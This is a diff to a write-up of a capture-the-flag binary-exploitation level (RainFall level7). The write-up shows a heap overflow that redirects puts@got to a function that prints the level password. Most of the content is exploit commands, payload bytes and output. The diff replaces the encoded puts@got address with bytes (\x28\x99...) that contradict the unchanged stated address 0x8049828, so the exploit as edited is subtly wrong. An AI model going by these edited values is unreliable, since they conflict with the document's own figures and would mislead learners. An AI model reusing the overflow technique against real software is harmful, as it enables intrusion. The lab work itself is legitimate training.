@@ -276,12 +276,12 @@ Program received signal SIGSEGV, Segmentation fault.
 
 ### 12. Crafting the Exploit Payload
 ```bash
-level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x98\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 ```
 **Payload Breakdown:**
 
 - First argument: Overflow node2 to overwrite node3->next with puts@got
-- puts@got: 0x8049828 (little-endian: \x28\x98\x04\x08)
+- puts@got: 0x8049828 (little-endian: \x28\x99\x04\x08)
 - Need 20 bytes of padding + the address
 - Second argument: Address of m() to write to puts@got
 - m(): 0x080484f4 (little-endian: \xf4\x84\x04\x08)
@@ -289,7 +289,7 @@ level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x98\x04\x08"') $(p
 First argument (argv[1]):
 ┌──────────────────────┬──────────────────┐
 │ 20 bytes of filler   │ puts@got address │
-│ "A"*20               │  \x28\x98\x04\x08│
+│ "A"*20               │  \x28\x99\x04\x08│
 └──────────────────────┴──────────────────┘
   Fills node2 buffer    Overwrites node3->next
   (8 bytes) + gap       to point to puts@got
@@ -303,7 +303,7 @@ Second argument (argv[2]):
 ```
 ## 13. Execute the Exploit
 ```bash
-level7@RainFall:~$ ./level7 $(python -c 'print "A"*20 + "\x28\x98\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
+level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
         ^
         Password printed directly!
@@ -339,7 +339,7 @@ GOT: puts@0x8049828 → [real_puts_address]
 After First strcpy (overflow):
 ```
 ```text
-Node2: [AAAAAAAA][AAAAAAAA][AAAAAAAA][\x28\x98\x04\x08]
+Node2: [AAAAAAAA][AAAAAAAA][AAAAAAAA][\x28\x99\x04\x08]
                           ↑
                       Overwrites node3->next!
 Node3: [value=2][next→0x8049828]  ← Now points to puts@got!
